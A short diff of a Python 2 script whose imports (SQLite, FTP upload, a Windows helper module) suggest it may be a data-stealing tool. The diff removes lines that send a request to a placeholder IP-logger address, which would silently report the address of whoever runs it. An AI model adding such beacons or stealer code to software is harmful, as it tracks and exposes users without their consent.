@@ -5,11 +5,8 @@ from os.path import expanduser
 from sqlite3 import connect
 from ftplib import FTP_TLS
 from re import findall
-import sys, requests, random
+import sys, random
 from winstr import *
-
-iplogger        = 'IPLOGGER'
-response        = requests.get(iplogger)
 
 reload(sys)
 sys.setdefaultencoding('utf-8')
